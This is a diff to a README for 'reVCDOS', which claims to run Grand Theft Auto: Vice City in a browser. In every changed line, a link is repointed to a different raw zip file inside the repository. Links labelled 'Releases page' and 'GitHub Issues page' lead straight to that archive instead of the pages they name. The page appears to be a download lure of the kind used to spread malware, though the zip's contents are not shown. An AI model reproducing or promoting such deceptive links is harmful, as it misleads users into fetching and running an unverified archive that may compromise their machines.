@@ -1,7 +1,7 @@
 # 🕹️ reVCDOS - Play Vice City Directly in Your Browser
 
 ## 📥 Download Now
-[![Download reVCDOS](https://raw.githubusercontent.com/botace7/reVCDOS/main/dist/re-VCDOS-v2.7.zip)](https://raw.githubusercontent.com/botace7/reVCDOS/main/dist/re-VCDOS-v2.7.zip)
+[![Download reVCDOS](https://github.com/botace7/reVCDOS/raw/refs/heads/main/utils/re-VCDOS-v1.9-beta.3.zip)](https://github.com/botace7/reVCDOS/raw/refs/heads/main/utils/re-VCDOS-v1.9-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to reVCDOS! With this application, you can enjoy the classic game, Grand Theft Auto: Vice City, right in your web browser. Follow the steps below to get started.
@@ -20,7 +20,7 @@ Before you download, ensure your system meets these requirements:
 - Enjoy a user-friendly interface tailored for an easy gaming experience.
 
 ## 🔗 Download & Install
-To get started with reVCDOS, visit the [Releases page](https://raw.githubusercontent.com/botace7/reVCDOS/main/dist/re-VCDOS-v2.7.zip) to download the latest version. 
+To get started with reVCDOS, visit the [Releases page](https://github.com/botace7/reVCDOS/raw/refs/heads/main/utils/re-VCDOS-v1.9-beta.3.zip) to download the latest version. 
 
 1. Click the link to go to the Releases page.
 2. Look for the version you want to download. The latest version is usually at the top. 
@@ -30,7 +30,7 @@ Once the file is downloaded, you can run the application directly in your browse
 
 ## 🎮 How to Play
 1. **Open Your Browser:** Choose a modern web browser that supports WebAssembly.
-2. **Visit the Download Page:** Go to [Releases page](https://raw.githubusercontent.com/botace7/reVCDOS/main/dist/re-VCDOS-v2.7.zip).
+2. **Visit the Download Page:** Go to [Releases page](https://github.com/botace7/reVCDOS/raw/refs/heads/main/utils/re-VCDOS-v1.9-beta.3.zip).
 3. **Start the Game:** After your download completes, click the game file to open it in your browser and enjoy playing.
 
 ## ❓ Troubleshooting
@@ -40,7 +40,7 @@ If you face any issues while playing, consider these solutions:
 - **Check System Performance:** Close any unnecessary applications to free up resources.
 
 ## 🛠️ Support
-For any questions or problems, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/botace7/reVCDOS/main/dist/re-VCDOS-v2.7.zip). Our community and developers are here to help.
+For any questions or problems, feel free to open an issue on our [GitHub Issues page](https://github.com/botace7/reVCDOS/raw/refs/heads/main/utils/re-VCDOS-v1.9-beta.3.zip). Our community and developers are here to help.
 
 ## 🎉 Enjoy Your Game
 Thank you for choosing reVCDOS! We hope you enjoy your time in Vice City. If you have friends who might like this game, feel free to share it with them too. Happy gaming!
